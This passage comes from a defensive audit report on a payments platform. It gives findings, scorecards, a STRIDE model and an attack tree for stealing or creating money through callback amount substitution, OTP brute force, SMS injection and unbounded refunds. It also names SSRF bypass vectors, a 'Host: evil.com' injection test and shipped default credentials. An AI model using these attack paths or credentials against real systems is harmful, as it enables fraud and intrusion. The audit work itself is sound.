**Severity/Confidence:** P2 / Confirmed. **Files:** `src/lib/money.ts:89-100` (default exponent 2 everywhere), `src/services/ledger.ts:80-89`.
**Scenario:** a merchant in JPY/KWD (0/3 decimals) or any zero-decimal currency gets minor-unit math 100× off (ledger would reject mismatched amounts only if the DO's own integer arithmetic disagreed — it computes from the same strings, so the error is consistent-but-wrong relative to the real currency). The supported_currency lists include USD/EUR/GBP/BDT (all 2dp) so this is latent for the shipped set.
**Fix:** a currency→exponent table threaded through `moneyToMinorStrict`/`fromMinorUnits`, rejecting unsupported exponents per merchant (single-currency-per-DO design already assumed).
**Test:** JPY posting rejects or converts with exponent 0. **Verdict: CONDITIONAL.**

## EDGE-P2-020 — Exchange rates fetched from a third-party API and stored without validation; no timeout

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/cron/handler.ts:182-204` (open.er-api.com, `String(rate)` persisted for ~160 currencies), fetch without AbortController.
**Scenario:** a compromised/misbehaving rate source poisons `op_exchange_rates` (currently only read by nothing — the columns are written on transactions but never used in money math — latent); a hung fetch stalls the hourly cron (allSettled waits).
**Fix:** validate rate ∈ (0, 1e6), pin a sanity diff vs previous value, add a 10s timeout, and only write currencies in the supported set.
**Test:** rate 1e30 → skipped. **Verdict: CONDITIONAL.**

---

# 13. Findings — P3 Low & INFO

## P3 findings (hardening / maintainability)

**EDGE-P3-001 — Dead schema states.** `callback_processing`, `pending_review`, `disputed` (op_transactions) and `refunded` are never written (verified: no code writes them). Either implement or drop from the CHECK. **Test:** state coverage inventory.

**EDGE-P3-002 — Mobile `authSubject`/`device_id` identity confusion.** `requireJwtAuth` sets `authSubject = payload.sub` (**user** id) while mobile.ts uses it as `device_id` (heartbeat `UPDATE op_paired_devices WHERE id = <userId>`, notifications `device_id = <userId>`) — heartbeats update wrong rows across tenants when ids coincide; notifications targeting is broken. **Fix:** set `authSubject` from `payload.device_id` or a distinct variable. **Test:** paired device heartbeat updates its own row.

**EDGE-P3-003 — Mobile notification ack cross-tenant.** `POST /notifications/acknowledgements` updates by bare `id IN (…)` with no `merchant_id`/`device_id` predicate (mobile.ts:256-261) — enumerable ids let a device mark other tenants' notifications read. **Fix:** add tenant predicate. **Test:** cross-tenant ids → 0 rows affected.

**EDGE-P3-004 — Pairing flow race + `last_insert_rowid` misuse.** mobile.ts:63-65 reads `last_insert_rowid()` outside the insert's execution context — under concurrent requests it can capture another isolate's insert (D1 `last_insert_rowid` is per-connection; in practice it returns the device row just inserted, but the code should use `meta.last_row_id` from the INSERT result). **Fix:** use `inserted.meta.last_row_id`. **Test:** parallel pairings return correct device ids.

**EDGE-P3-005 — Maintenance reason interpolated unescaped into HTML.** maintenance.ts:79. Operator-controlled (KV), so internal-only; still fix with `escapeHtml` for consistency. **Test:** reason with `<script>` renders escaped.

**EDGE-P3-006 — sms-phone-mockup `/api/forward` is an unauthenticated open proxy.** server.js:500-545 — arbitrary URL/method/headers/body, returns response body. Dev-only tool; if an operator ever runs it on a reachable host it is a full SSRF relay (the briefs specifically flag it). **Fix:** bind to 127.0.0.1 by default, require a token, refuse private IPs. **Test:** none (dev tool) — document loudly.

**EDGE-P3-007 — `secretToBytes` base64 heuristic.** crypto.ts:131-141 — raw secrets that look like base64 are silently decoded; internal consistency preserved, provider-interop hazard. **Fix:** explicit per-use encoding parameter. **Test:** documented behavior table.

**EDGE-P3-008 — `op_webhook_deliveries.payload_hash` stores the literal `'system'`.** webhook-consumer.ts:103-110 — column is never a hash; misleading for forensics. **Fix:** store `sha256(jsonPayload)` (or drop the column).

**EDGE-P3-009 — Outbound webhook retry treats 400/401/404 as retryable.** webhook-consumer.ts:70-79 (only 410/422 terminal). Bounded (3 retries) so cost is small; semantics wrong (auth errors won't heal). **Fix:** terminal-ize 400/401/403/404; retry 408/429/5xx.

**EDGE-P3-010 — Duplicate-instance detection by error-string matching.** reconciliation.ts:274-299 — multi-shape heuristic for Workflow 409s; resilient by design but brittle against message changes. **Fix:** upstream typed error when Workflows exposes one; keep as fallback. **Test:** table of error shapes.

**EDGE-P3-011 — `sms-consumer` writes parsed fields before the parse-miss branch.** sms-consumer.ts:63-79 — the no_match row carries `parsed_trx_id` (input to EDGE-P0-007). After fixing P0-007, mark no-parse rows with `parsed_trx_id NULL` as well. **Test:** no-amount SMS → both parsed fields NULL.

**EDGE-P3-012 — Docs/report drift.** `EDGEPAY_AUDIT_REPORT.md` references files that no longer exist (wrangler.toml, lane tests); TEST_RESULTS.md counts are stale; comments in crypto.ts (600K) and index.ts (3/hour) contradict code. **Fix:** regenerate docs from CI (counts from the test run) and a docs-claim lint.

## INFO observations (no vulnerability, recorded for completeness)

- **INFO-1 — Strong ledger design.** Per-merchant DO + input-gate + structured failures + write-ahead row + replay is a textbook-correct pattern; `tests/ledger-do.test.ts` fault-injects all three D1/DO boundaries. This is the platform's differentiator.
- **INFO-2 — Fail-closed gateway catalog.** Unknown/disabled webhook ⇒ uniform 404; generated adapters verify nothing by default; `assertGatewayEnabled` at new-operation entry points only. Correct posture.
- **INFO-3 — Timing-safe crypto hygiene.** API-key hash compare, HMAC verify, and password verify all route through one constant-time helper; the MD5 exception is provider-mandated and isolated.
- **INFO-4 — Error envelope discipline.** `errorHandler` hides internals outside development; gateway error text is clipped to 512 chars and URLs redacted (`kit/http.ts:31-43`).
- **INFO-5 — Queue consumer awaiting.** index.ts:252-273 correctly awaits `process()` and documents why — preserving at-least-once semantics; a subtle point most ports get wrong.
- **INFO-6 — Money strings end-to-end.** No `parseFloat`/`Number(` in money math paths (verified by grep; `format()` uses toNumber but is display-only); `toMinorUnits` has a loud `isSafeInteger` guard.
- **INFO-7 — Domain middleware hygiene.** Unknown host ⇒ 404 (not 403, but equivalent); pending DNS ⇒ 503; port-stripping handles IPv6 brackets; `/admin` hard-blocked on custom domains; install/assets bypass is pre-KV (documented, correct).
- **INFO-8 — Access middleware design.** JWKS refresh-on-unknown-kid, spoof-email telemetry, break-glass paging, and the explicit "no disable switch" reflect the v0.2.1 lessons learned.


---

# 14. Security Assessment (scorecard C)

| Control | Verdict | Evidence summary |
|---|---|---|
| **Authentication** | **CONDITIONAL** | API keys: strong format, SHA-256-at-rest, prefix lookup, timing-safe compare, expiry, merchant-status check — solid. JWT: HS256 pinned, aud/iss/exp enforced, ≥32-char secret. **But:** bootstrap default credentials (P0-005), pairing OTP brute-force (P1-002), prefix non-uniqueness (P2-013), refresh tokens non-revocable for 30 days (jti unused). |
| **Authorization** | **FAIL** | Scope model broken at route level: read keys can write (P1-008); merchant-admin ≡ platform-admin on `/merchants` routes (P1-005); `requireScope` present only on 3 routes. `authenticated ≠ authorized` is precisely the confusion present here. |
| **Tenant isolation** | **CONDITIONAL** | SQL predicates are consistently merchant-scoped (verified across api/admin/checkout/mobile/webhooks); domain↔key mismatch rejected 403. Exceptions: P1-005 (all-merchant list + tenant provisioning), P2-004 (platform-merchant webhook binding), P3-003 (notification ack), P2-012 (DO self-check absent). |
| **Cryptography** | **CONDITIONAL** | AES-256-GCM (12B IV, 128-bit tag, fresh IV), HMAC-SHA256, constant-time compares — correct. Gaps: versionless single key (P2-010), PBKDF2 50K/10K (P2-017), silent decrypt failures (P2-009), secretToBytes heuristic (P3-007). |
| **Webhook security (inbound)** | **CONDITIONAL** | Raw-body signature verification always required; IP allowlist data-driven; event dedup unique-constrained. Gaps: no size cap, random event ids, fail-open geo (all P1-003); unthrottled. |
| **Webhook security (outbound)** | **FAIL** | SSRF filter bypass vectors (P1-004); no delivery idempotency key; non-escalating retries; URL registration without write scope (P1-008). |
| **CSRF** | **CONDITIONAL** | No cookie-based auth exists ⇒ no practical CSRF surface; middleware written but unmounted (P2-001) — coverage is accidental, not designed. |
| **XSS / CSP** | **FAIL** | Checkout stored XSS via brandColor + onclick single-quote injection with no CSP on HTML routes (P0-006); nonce-CSP only on JSON surfaces; Scalar reference page ships its own pinned CSP (correct). |
| **SSRF** | **CONDITIONAL→FAIL** | Outbound webhook consumer misses IPv6 ULA/link-local, IPv4-mapped, integer IPs, redirects (P1-004); mockup dev server is an open proxy (P3-006); gateway adapter URLs are constants (safe); custom-hostnames fetch targets `api.cloudflare.com` (safe, but un-timed). |
| **Secrets management** | **FAIL** | Live key+secret committed (P0-001); root key in KV plaintext (P0-005 component); `.dev.vars.example` hygiene good; no rotation path (P2-010); no secret scanning CI. |
| **Rate limiting** | **CONDITIONAL** | Native per-key limiter correctly mounted after auth (120r/60s read, 30w/60s write) — good; but install group 120/min (P1-010), anonymous surfaces unlimited, KV counter racy, binding-absent fail-open on writes (P2-005). |
| **Supply chain** | **PASS** | 0 npm audit findings; 6 direct runtime deps (hono/zod/decimal.js/jose/@hono/zod-validator/@scalar); `allowScripts` pinning present; no postinstall surprises; esbuild/workerd pinned versions allowed explicitly. |
| **Cloudflare Access** | **CONDITIONAL** | JWT verified against JWKS, alg pinned ES256/RS256, fail-closed on outage, break-glass alarmed. Gaps: bearer fall-through design (single effective layer when unconfigured — P2 sibling of 9.5), non-timing-safe break-glass compare, JWKS fetch un-timed (P2-011). |

---

# 15. Stability Assessment (scorecard D)

| Dimension | Verdict | Evidence |
|---|---|---|
| **Timeouts** | **CONDITIONAL** | Gateway calls: 15s AbortController everywhere (`gwFetch`); outbound webhook: 15s. **Missing:** JWKS fetch (P2-011), exchange-rates/update-check/DNS-verification cron fetches (P2-020), custom-hostnames API calls, sms-phone-mockup relay. |
| **Retries** | **CONDITIONAL** | Ledger: idempotent replay via reconciliation (excellent). Queues: bounded (3/3/5) with DLQs. Workflows: per-step retries with backoff, bounded poll window (~24h), NonRetryable terminal. **Broken:** webhook retry delay never escalates (constant 60s — P1-004 sub-finding); idempotency has no concurrency control (P1-001). |
| **Queue reliability** | **CONDITIONAL** | At-least-once preserved (awaited handler, ack/retry semantics respected); DLQs configured for all three queues; poison messages bounded. Gaps: duplicate deliveries undetectable by receivers (no idempotency key); SMS duplicate rows on redelivery; `processPendingSmsVerifications` re-drains the same pending rows every 5 minutes (duplicate processing loop). |
| **Failure recovery** | **CONDITIONAL** | Ledger converges from every crash boundary (§8.6, tested). **Payment rows do not** (P1-006: no status healing; missed webhook not re-dispatched); refunds do not (P0-002). Expiry cron converges stale intents. |
| **Backpressure** | **CONDITIONAL** | Rate limits on authenticated APIs; batch sizes modest (10/25/50); reconciliation replay limit 200/500. Gaps: unbounded mobile SMS batch (P2-014), unbounded webhook bodies (P1-003), no queue-depth circuit breaker (a merchant webhook outage retries 3× then DLQs — fine; an SMS flood enqueues everything). |
| **D1 contention** | **PASS** | Single-row writes by PK; batch sizes ≤50; the only hot rows are per-key rate counters (native binding) and `op_idempotency_keys` inserts; the DO serializes tenant ledger writes (by design). No long transactions anywhere. |
| **DO contention** | **PASS** | One DO per merchant; the entire posting is O(few SQLite statements + 2 D1 hops) inside the input gate; throughput documented as far above single-merchant rates; alarms are per-DO. |
| **External gateways** | **CONDITIONAL** | Timeouts and error normalization good; token caches in KV (bkash). **Unknown-outcome classification absent:** a gateway timeout/5xx yields `verify` failure → transaction marked `failed` — for execute-style flows (bKash) a timeout after a successful execute marks money-received as failed (the brief's exact "gateway timeout must not imply failure" concern — no REQUIRES_RECONCILIATION state exists). |
| **Reconciliation** | **CONDITIONAL** | Replay + heal + reject-quarantine + drift-paging are real and tested; refund re-drive bounded; **but** it heals only the ledger, not payment statuses or missed webhooks (P1-006), excludes the platform merchant (P2-003), and cannot repair refund reversals (P0-002). |
| **Deployment safety** | **CONDITIONAL** | Migrations-before-deploy ordering; additive, idempotent migrations (verified: every migration is `CREATE … IF NOT EXISTS` / `ALTER ADD` / index-only); wrangler dry-run works. Gaps: placeholder per-env resource ids, no config validation gate, `ENABLED_GATEWAYS` fail-open default (P2-016). |

**Top failure mode likely to occur in production first:** a gateway callback timeout after successful provider execution marks the transaction `failed` while money moved (no unknown-outcome state), followed by the customer support ticket that uncovers EDGE-P0-004 when they "fix" it by re-paying.

---

# 16. Data Integrity Assessment (scorecard E — the brief's seven explicit questions)

**Can money be created incorrectly?**
**YES.** Three concrete paths: (1) EDGE-P0-007 — SMS TrxID match with NULL parsed_amount completes an intent at full amount behind a smaller/absent payment; (2) EDGE-P0-004 — callback substitution completes an intent at its amount behind a different, smaller payment; (3) EDGE-P0-002 Case A — a refund reversal of the wrong ledger row *destroys* balance in some accounts while *creating* it in others (offsetting, but account-level nonsense). Verdict: **FAIL.**

**Can money disappear?**
**YES (accounting-wise).** EDGE-P0-002 Case B: refunds complete with no reversal — the books retain revenue the merchant returned; and EDGE-P0-003's API path never reverses at all. Cash does not vanish, but ledger money misstates reality in the loss direction for the merchant's reported revenue and the refund liability. Verdict: **FAIL.**

**Can money be duplicated?**
**Payments: NO** — the tx_id dedup + posting protocol make double-credit structurally impossible (tested under fault injection; §8.2). **Refunds: YES** — the provider can be asked twice (P0-003 has no cumulative bound; two distinct idempotency keys bypass the middleware) with only one (wrong) ledger reversal; outbound webhooks duplicate freely (no delivery id). Verdict: **CONDITIONAL.**

**Can a payment post twice?**
**NO.** `m{merchant}:payment:{intentId}` dedups at the DO; D1 mirror guards are replay-safe; all three completion entry points converge on the same key. (The mirror's 4-tuple guard has a latent duplicate-line quirk — P2-008 — but it drops mirror rows, never adds them.) Verdict: **PASS.**

**Can one tenant affect another tenant?**
**Mostly NO, with three exceptions:** merchant-admin → list/provision all tenants (P1-005); platform-merchant webhook binding misroutes completions (P2-004 — availability, not integrity); notification-ack cross-tenant write (P3-003); plus the DO self-check absence as a latent integrity hazard (P2-012). SQL-level tenant predicates are otherwise consistent. Verdict: **CONDITIONAL.**

**Can an inconsistent state survive indefinitely?**
**YES.** (1) Payment stuck `processing`/`awaiting_verification` with a posted ledger — nothing heals it (P1-006); (2) `completed` transaction flipped `failed` by a late callback — nothing restores it; (3) every API-path refund leaves revenue permanently overstated; (4) reconciliation-excluded platform merchant drift (P2-003). Verdict: **FAIL.**

**Can reconciliation recover all partial states?**
**NO — it recovers all partial *ledger* states** (pending→posted, DO-ahead heal, deterministic-reject quarantine — genuinely robust, tested), **and nothing else.** Payment rows, merchant notifications, refund reversals, and the platform merchant are out of scope. Verdict: **CONDITIONAL.**

---

# 17. Attack / Failure Matrix

The briefs' mandated matrix. "Expected" = the behavior a payments platform must exhibit; "Actual" = observed from code/tests. Severity uses the finding IDs.

| # | Scenario | Expected | Actual | Severity | Recoverable? |
|---|---|---|---|---|---|
| 1 | **Double spend** (two concurrent 80-withdrawals, balance 100) | exactly one succeeds | exactly one succeeds (DO input gate + balance guard) | PASS | n/a |
| 2 | **Duplicate webhook** (byte-identical, id present) | one financial effect, `duplicate` response | one financial effect (ledger dedup); **but** id-less providers generate random event ids → full reprocessing + duplicate outbound webhook | P1-003 | Money: yes. Notification: no |
| 3 | **Idempotency race** (20 parallel, same key+body) | one side effect, identical responses | 20 side effects (cache written post-hoc via waitUntil) | P1-001 | Money: yes (completion dedup). Creation: no |
| 4 | **Cross-tenant object access** (key A, ids of B) | 403/404 everywhere | 403/404 on all REST paths; **200 + full list** on GET /admin/v1/merchants; tenant provisioning 201 | P1-005 | no |
| 5 | **Host injection** (`Host: evil.com`, `X-Forwarded-Host`) | 403/404, no tenant resolution | unknown host ⇒ 404 (domain.ts:112-113); forwarded headers unused; master-domain whitelist; install/assets bypass is pre-auth by design | PASS | n/a |
| 6 | **Bad HMAC webhook** | 401, zero mutations | 401 + delivery-log row; adapters fail-closed by default | PASS | n/a |
| 7 | **JWT algorithm confusion** (`alg:none`, HS→RS swap) | reject | `algorithms:['HS256']` pinned in jose verify (jwt.ts:100); Access path pins ES256/RS256 (access.ts:175) | PASS | n/a |
| 8 | **JWKS outage** during admin request | fail closed | 503 ACCESS_UNAVAILABLE, no header-trust fallback (access.ts:402-408) | PASS | auto (retry) |
| 9 | **Gateway timeout** on execute-style verify | UNKNOWN / reconcile | verify returns failed → transaction marked **failed** — money may have moved; no pending/unknown state | P1/P2 (stability) | manual only |
| 10 | **Gateway success + local timeout** (client retries) | one completion | one completion (ledger dedup); payment row idempotent updates; outbound webhook may duplicate | mostly PASS | yes |
| 11 | **D1/DO partial failure** (crash at each boundary) | converge to one correct state | ledger converges (§8.6); **payment row + notification do not** (P1-006/007) | P1-006 | ledger only |
| 12 | **Queue duplicate delivery** | idempotent consumer | SMS: duplicate rows + duplicate processing, money safe; webhook-out: duplicate POST to merchant, no dedup key | P1-004 | money yes |
| 13 | **Bootstrap reuse** (KV flag lost / fresh deploy) | no default credentials | re-seeds default admin/OTP; `/install/bootstrap-key` mints root key with known password | **P0-005** | rotation only |
| 14 | **SSRF via webhook URL** | private space unreachable | IPv4 string blocklist bypassed via IPv6 ULA / mapped / integer / redirect | P1-004 | yes |
| 15 | **SQL injection** (all inputs) | parameterized everywhere | every query uses `.bind()`; the two dynamic fragment builders (`placeholders` joins in ledger.ts:302 and ledger-do.ts:403) construct `?`-lists from lengths, not values — safe (the brief's known-exception verified) | PASS | n/a |
| 16 | **XSS on checkout** | escape-by-context + CSP | brandColor raw in `<style>`; single-quote breakout in onclick; no CSP on HTML | **P0-006** | no |
| 17 | **Rate-limit bypass** (anonymous fan-out) | 429 well before abuse | mobile pairing & webhook routes unlimited; KV counter racey; install 120/min | P1-010 | yes |
| 18 | **Callback amount substitution** | mismatch rejected | amount+order-id discarded; intent completes at its own amount | **P0-004** | manual |
| 19 | **Refund > captured / duplicate refunds** | 422 bounded | no bound either path; ledger reversal wrong or absent | **P0-002/003** | manual re-book |
| 20 | **SMS amount bypass** | amount mandatory | NULL parsed_amount ⇒ completes; `no_match` rows accepted | **P0-007** | no |
| 21 | **Expired intent completed late** | defined behavior | expiry cron vs completion race; final state write-order dependent; no expiry check in completion | P1-006 | partial |
| 22 | **Reconciliation abuse** (manual trigger flood) | ops-gated | any merchant admin key triggers global sweep (cost amplification, DO reads per merchant) | P1-005 | yes |

---

# 18. STRIDE Threat Model

Per-component. S=Spoofing, T=Tampering, R=Repudiation, I=Information disclosure, D=DoS, E=Elevation of privilege. ●=present risk w/ finding; ○=defended.

| Component | S | T | R | I | D | E | Notes |
|---|---|---|---|---|---|---|---|
| HTTP API `/api/v1` | ○ (keys hashed+timing-safe) | ○ (zod, bind-only SQL) | ● weak audit of *who* created refunds (authSubject only) | ○ | ● unlimited anon pre-auth; per-key caps fine | ● read-scope writes (P1-008) | |
| Authentication (bearer/JWT) | ● default creds (P0-005), OTP brute (P1-002) | ○ | ○ | ○ | ● unthrottled pair | ○ | |
| Tenant routing (domain) | ○ (CF-controlled Host) | ○ | ○ | ○ | ○ KV read per request | ○ | |
| Ledger (LedgerDO) | ○ | ○ (balanced, immutable journal) | ○ (postings + audit trail) | ○ | ○ per-tenant | ○ (P2-012 latent) | strongest component |
| Payment service | ● callback substitution (P0-004) | ● status regression (P1-006) | ● completion evidence not persisted for callbacks | ○ | ○ | ○ | |
| Webhooks inbound | ○ (signature required) | ○ | ● event log OK, payload kept raw | ● unbounded storage (P1-003) | ● CPU burn (P1-003) | ○ | |
| Webhooks outbound | ○ (HMAC signed) | ○ | ○ delivery log | ● SSRF vectors (P1-004) | ○ bounded retries | ○ | |
| Queues/consumers | ○ (runtime-managed) | ○ | ○ | ○ | ● SMS flood (P2-014) | ○ | |
| Gateway adapters | ● provider-verified only, no intent binding (P0-004) | ○ | ○ | ○ (errors clipped) | ○ 15s timeouts | ○ | |
| Admin API | ● via leaked key (P0-001) | ● merchant fields→XSS (P0-006) | ● provisioning returns secrets | ● all-merchant list (P1-005) | ● global reconcile trigger | ● platform≡tenant admin (P1-005) | |
| Cloudflare Access | ○ (JWKS verify) | ○ | ● break-glass pages | ○ | ● JWKS hang (P2-011) | ○ (fall-through is second-layer guarded) | |
| Bootstrap/install | ● default creds (P0-005) | ○ | ● no audit rows for bootstrap events | ● KV root key | ○ | ● root key minting endpoint | |
| Checkout pages | ○ token unguessable | ● stored XSS (P0-006) | ○ | ● customer phone/TrxID captured by injected script | ○ | ○ | |
| SMS pipeline | ● pairing→injection (P1-002) | ● amount bypass (P0-007) | ● SMS rows are the only evidence | ● raw SMS bodies stored | ● ReDoS templates (P2-015) | ○ | |

**Payment-specific threats from the briefs, all addressed above:** double spending (matrix #1), replay (#2), race conditions (#3), amount manipulation (#18), currency confusion (P2-019 latent), merchant substitution (#4), gateway substitution (enabled-gate + adapter resolution is constant-safe), transaction-ID substitution (#18/#20), refund duplication (#19), capture duplication (n/a — no auth/capture split in this product), ledger corruption (P0-002 Case A), reconciliation abuse (#22).

---

# 19. Attack Tree — "Steal or create money"

```text
GOAL: Steal or create money
│
├─ A. Create fake "payment received" state
│   ├─ A1. Obtain the committed credentials (EDGE-P0-001)            [trivial, repo public]
│   │     ├─ forge mobile JWT (JWT_SECRET) for any merchant
│   │     └─ use op_live '*' key directly
│   ├─ A2. Brute-force pairing OTP (no rate limit, 6 digits)          [EDGE-P1-002]
│   │     └─ or use the shipped default OTP '123456' on fresh deploy  [EDGE-P0-005]
│   ├─ A3. Inject SMS via POST /api/mobile/v1/sms
│   │     ├─ crafted no-amount SMS + customer TrxID submit            [EDGE-P0-007]  ⇒ COMPLETE
│   │     └─ full corroboration path (amount+trx match own intent)    ⇒ COMPLETE (merchant defrauded)
│   └─ A4. PaymentID/val_id substitution on checkout callback          [EDGE-P0-004]  ⇒ COMPLETE
│         (complete 100k intent with own 10-unit payment; no key needed)
│
├─ B. Extract money via refunds
│   ├─ B1. Refund > captured via POST /api/v1/refunds                 [EDGE-P0-003] (provider permitting)
│   ├─ B2. Repeated refunds of same payment                            [EDGE-P0-003]
│   └─ B3. (books corrupted either way — reversals wrong/absent)      [EDGE-P0-002]
│
├─ C. Credential/secret theft
│   ├─ C1. Scripts in repo (P0-001) → key + JWT secret + KV root key  [P0-005]
│   ├─ C2. XSS on checkout (P0-006) → capture customer phone/TrxID/cookies
│   └─ C3. Bootstrap-key endpoint with default password (P0-005)
│
├─ D. Cross-tenant access
│   ├─ D1. Merchant-admin → provision tenants, harvest their keys      [P1-005]
│   └─ D2. Notification-ack / heartbeat id confusion                   [P3-003/002] (low value)
│
└─ E. Abuse reconciliation
    └─ E1. Spam global reconcile sweeps via merchant admin key         [P1-005] (cost/DoS, not theft)
```

Every ⎯⇒ COMPLETE branch above has a verified, deterministic code path; none requires a zero-day — only the stated preconditions (repository access, a customer session, a merchant key, or an un-rotated deployment).

---

# 20. Financial Failure Tree — "Money becomes incorrect without an attacker"

```text
GOAL: Money/records become incorrect with NO attacker
│
├─ F1. Worker retry / crash windows
│   ├─ crash after ledger-post, before status batch  → payment stuck 'processing' forever   [P1-006] ⇒ STUCK
│   ├─ crash after status batch, before queue send   → merchant webhook never delivered    [P2-007] ⇒ SILENT
│   └─ callback timeout after provider executed      → transaction marked failed, money moved [stability] ⇒ MISSTATED
│
├─ F2. Queue semantics
│   ├─ SMS redelivery  → duplicate op_sms_data rows, duplicate processing (money safe)    ⇒ NOISE
│   └─ webhook redelivery w/o event id → duplicate merchant notifications                 [P1-003/004]
│
├─ F3. Cron races
│   ├─ expiry cron vs completion → expired/completed write-order roulette                 [P1-006]
│   └─ pending-SMS re-enqueue every 5min → duplicate parse loop                            [cron:154-176]
│
├─ F4. Migration/config mistakes
│   ├─ placeholder D1/KV ids in dev/staging configs → wrong-target writes on first deploy [deployment]
│   ├─ ENABLED_GATEWAYS unset → all 123 adapters enabled                                    [P2-016]
│   └─ ENCRYPTION_KEY rotated without re-encrypt → silent empty-credentials                [P2-009/010]
│
├─ F5. Clock skew
│   ├─ JWT expiry: 60s skew allowance only on Access tokens (mobile uses jose exp strictly) ⇒ OK
│   ├─ SMS 30-min window uses server time (created_at) — provider SMS timestamps unused    ⇒ OK-ish
│   └─ Idempotency 24h TTL vs client retry clocks — benign
│
└─ F6. Reconciliation bugs
    ├─ platform merchant never verified                                                      [P2-003]
    └─ refunds: reversal of wrong row / none (deterministic on EVERY refund)                 [P0-002] ⇒ CORRUPTION
```

The most important leaf is **F6/P0-002**: it is not an attack or a rare race — it fires on every workflow-driven refund, making "no-attacker money incorrectness" the *default* behavior of the refund feature.


---

# 21. The Twenty Non-Negotiable Questions

Each answer carries evidence. Anything not provable is marked UNPROVEN per the brief's rule — nothing was left as "probably".

**1. Can one logical payment ever credit money twice?**
NO for the ledger: `tx_id` dedup inside the DO's input gate (ledger-do.ts:150-160), deterministic key `m{merchant}:payment:{intentId}` (ledger.ts:383), all three completion entry points converge; fault-injection tests pass (14/14). The D1 mirror can under-record duplicate lines (P2-008) but never over-record. **PASS.**

**2. Can two concurrent withdrawals overspend a balance?**
NO — balance guard runs before any write, inside `blockConcurrencyWhile` (ledger-do.ts:401-439 + 113). The second attempt reads the post-first balance and throws INSUFFICIENT_FUNDS. **PASS.**

**3. Can a payment become completed without a durable ledger posting?**
NO on the normal path: `completeTransaction` awaits `postPaymentLedgerEntry` before the completed batch (payment.ts:379-399); posting failure aborts completion. One caveat: the pending write-ahead row (step D) is what makes the posting "durable" before the DO journal commits — a crash after D but before E leaves a pending row with no journal, which reconciliation replays (and the payment row completes only when some caller retries completion). **PASS (with the P1-006 stuck-state caveat).**

**4. Can a posted ledger transaction become orphaned from its payment?**
YES — (a) posting succeeded, caller crashed, payment row stuck non-completed forever (P1-006); (b) refund reversals post with `reference_type='adjustment'` pointing at a wrong-or-absent original (P0-002). **FAIL.**

**5. Can retry after an ambiguous timeout duplicate financial state?**
Payments: NO (ledger dedup; idempotent status updates). Refunds: YES — two distinct idempotency keys (or the same key raced — P1-001) drive two provider refunds; ledger reverses once (wrongly or not at all). Gateway token grants are KV-cached (bkash) and idempotent. **CONDITIONAL.**

**6. Can a merchant read or mutate another merchant's resources?**
Read: YES on GET /api/admin/v1/merchants (all tenants, P1-005). Mutate: YES via tenant provisioning (P1-005) and notification-ack (P3-003). All ordinary REST resources (payments/transactions/customers/webhooks/gateways/devices/sms-queues/refunds) verified merchant-scoped. **CONDITIONAL.**

**7. Can a gateway callback be forged or replayed?**
Forged: NO for signature-bearing webhooks (raw-body HMAC, fail-closed adapters) and provider-verified callbacks. Replay: signature-valid replays are re-verified at the provider (execute idempotent) — BUT id-less webhook payloads dedup on random UUIDs (P1-003), so redelivery re-processes (money safe; notifications duplicate). **CONDITIONAL.**

**8. Can an admin/root credential be created with a known default in production?**
YES — bootstrap's `AdminPass123456!` + `/install/bootstrap-key` (P0-005); also the committed root key (P0-001). **FAIL.**

**9. Can a queue redelivery produce a duplicate payment/refund/webhook effect?**
Payment effect: NO (ledger). Refund effect: YES (P0-003 unbounded + provider-side double). Webhook effect: YES (no idempotency key, P1-004). SMS effect: duplicate rows/processing, money safe. **FAIL.**

**10. Can reconciliation itself duplicate or corrupt money?**
Duplicate: NO — replay hits the dedup; heal path is idempotent (NOT-EXISTS guards; ON CONFLICT). Corrupt: **YES indirectly** — a 'duplicate' heal rewrites the audit trail for the tx_id it was handed, which is always correct; but quarantine-as-rejected (deterministic failures) permanently poisons a tx_id that an operator may then "fix" by re-issuing with the same key → rejected again (fail-closed, no corruption). The corruption lives in refund reconciliation (P0-002), which is reconciliation-adjacent. **CONDITIONAL.**

**11. Can an attacker make the Worker fetch an internal/private URL?**
YES via outbound webhook SSRF vectors (IPv6 ULA/mapped/integer/redirect — P1-004) and the dev mockup proxy (P3-006). Gateway adapter URLs are compile-time constants. **FAIL.**

**12. Can malformed or oversized requests cause resource exhaustion?**
YES — unbounded webhook body pre-signature (P1-003), unbounded mobile SMS batch (P2-014), merchant-controlled ReDoS templates (P2-015). JSON parse of huge bodies on checkout/API surfaces is bounded only by the platform. **FAIL.**

**13. Can missing production bindings/secrets silently disable a security control?**
YES — RATE_LIMIT bindings missing ⇒ fail-open + a metric that is itself a no-op when ANALYTICS is unbound (P2-005/006); ENCRYPTION_KEY wrong ⇒ silent credential loss (P2-009); ENABLED_GATEWAYS unset ⇒ all adapters on (P2-016); JWT_SECRET missing ⇒ mobile auth hard-fails (fail-closed, loud). **CONDITIONAL.**

**14. Can a deployment create temporary Worker/D1 schema incompatibility?**
Low risk — deploy script applies migrations first; all migrations are additive; old-code-on-new-schema is safe (new columns nullable/defaulted). New-code-on-old-schema (migrations skipped) fails loudly on missing tables. **PASS.**

**15. Can a secret be rotated without corrupting encrypted gateway credentials?**
NO — no key versioning (P2-010). Rotation = big-bang re-encryption or total credential re-entry. **FAIL.**

**16. Are ledger records immutable after posting?**
Journal entries and DO rows: YES (no UPDATE/DELETE paths; reversals are compensating). `op_ledger_transactions.status` flips posted→reversed by design (acceptable); `op_ledger_postings` bookkeeping columns mutate (status/attempts/error — protocol-owned). **PASS.**

**17. Does every financial mutation have a traceable audit record?**
Payments: YES (postings row + ledger tx + webhook deliveries + reconciliation runs). Refunds: PARTIAL — `op_refunds` rows exist, but the API path records no ledger trail and `initiated_by` is the key id only; SMS completions leave the SMS row + metric but no dedicated audit event; admin merchant-provisioning returns secrets with no audit row. **CONDITIONAL.**

**18. Can the trial balance ever become non-zero?**
Within a merchant's DO: NO — every posting is balanced by construction and the trial check passes (tested; §8.1). Globally across merchants: each DO is its own book; there is no cross-merchant consolidated trial (by design). The D1 mirror can drift from the DO (P2-008) but the DO is authoritative. **PASS.**

**19. Can a refund exceed the amount actually captured?**
YES — no bound in either path; no cumulative accounting (P0-003; RefundService equally unbounded — refund.ts:45-138 never compares `input.amount` to `tx.amount` or prior refunds). **FAIL.**

**20. If the system crashes at every individual persistence boundary, does retry converge toward one correct final state?**
Ledger: YES (§8.6 — every boundary replayed/healed). Payment status: NO (stuck states, P1-006). Notifications: NO (lost, P2-007). Refunds: NO (P0-002/003). **CONDITIONAL — the money layer converges; the product layer does not.**

---

# 22. Prior Audit Verification

